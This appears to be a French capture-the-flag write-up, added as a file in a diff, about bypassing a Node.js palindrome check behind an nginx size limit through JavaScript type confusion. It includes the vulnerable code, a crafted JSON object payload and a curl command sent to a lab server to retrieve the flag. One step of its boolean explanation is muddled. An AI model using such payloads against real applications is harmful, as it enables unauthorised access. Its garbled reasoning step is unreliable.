@@ -1,0 +1,102 @@
+- Une application web qui vérifie si une chaîne de caractères est un palindrome.
+- Le twist : le palindrome doit avoir au moins 1000 caractères, mais nginx limite la taille des requêtes à 75 bytes
+- Ce qui rend impossible l'envoi d'un palindrome légitime de 1000 caractères.
+
+Structure de l'application
+
+.
+├── app
+│   ├── index.html      # Interface web
+│   ├── index.mjs       # backend Node.js 
+│   └── package.json
+├── config
+│   ├── nginx.conf      # Config nginx
+│   └── supervisord.conf
+├── Dockerfile
+├── flag.txt
+└── start.sh
+
+Contradiction apparente : 
+Backend Node.js (index.mjs) :
+
+if (string.length < 1000) {
+    return 'Tootus Shortus';
+}
+
+- Requiert une chaîne d'au moins 1000 caractères.
+- Frontal nginx (nginx.conf) :
+- client_max_body_size 75;
+- Limite le body des requêtes à 75 bytes.
+- Un palindrome de 1000 caractères nécessiterait au minimum 1000 bytes (sans compter l'encodage JSON) ce qui est impossible avec la limite de 75 bytes.
+
+Analyse du code vulnérable
+La fonction IsPalinDrome dans index.mjs :
+
+const IsPalinDrome = (string) => {
+    if (string.length < 1000) {
+        return 'Tootus Shortus';
+    }
+
+    for (const i of Array(string.length).keys()) {
+        const original = string[i];
+        const reverse = string[string.length - i - 1];
+
+        if (original !== reverse || typeof original !== 'string') {
+            return 'Notter Palindromer!!';
+        }
+    }
+
+    return null;
+}
+
+Problème : 
+- La fonction n'effectue pas de vérification de type sur le paramètre string
+- Elle suppose que c'est une vrai chaîne de caractère
+- Mais en Js on peut accéder aux propriétés d'un objet de la même manière
+
+Vulnérabilité : Type Confusion JavaScript
+En JavaScript :
+- Les objets peuvent avoir une propriété length
+- Les propriétés peuvent être accédées via la notation []
+- Array("1000") crée un tableau avec un seul élément "1000", pas un tableau de 1000 éléments
+
+Exploitation
+Payload : {"palindrome": {"length": "1000", "0": "a", "999": "a"}}
+
+Explication étape par étape 
+- Vérification de longueur : if (string.length < 1000)  // string.length = "1000"
+- JavaScript convertit "1000" en nombre : 1000 < 1000 = false
+- Création de la boucle : Array(string.length).keys()  // Array("1000").keys()
+
+Array("1000") crée ["1000"] (tab avec 1 élément)
+.keys() retourne un itérateur sur [0] seulement
+La boucle ne s'exécute qu'une seule fois pour i = 0
+
+- Première itération (i = 0) : 
+original = string[0] = "a"
+reverse = string[string.length - i - 1] = string["1000" - 0 - 1] = string["999"] = "a"
+
+- original === reverse → "a" === "a" = true 
+- typeof original !== 'string' → typeof "a" !== 'string' = false 
+- Condition complète : true || false = true → mais c'est !== donc passe 
+
+Fin de la boucle :
+- Comme Array("1000").keys() ne contient que [0] la boucle se termine après une itération
+
+Payload : 
+
+curl -X POST http://94.237.58.137:42403/ \
+  -H "Content-Type: application/json" \
+  -d '{"palindrome": {"length": "1000", "0": "a", "999": "a"}}'; echo
+
+Résultat : Hii Harry!!! HTB{...}
+
+Réference : 
+https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array
+https://www.freecodecamp.org/news/js-type-coercion-explained-27ba3d9a2839/
+
+
+
+
+
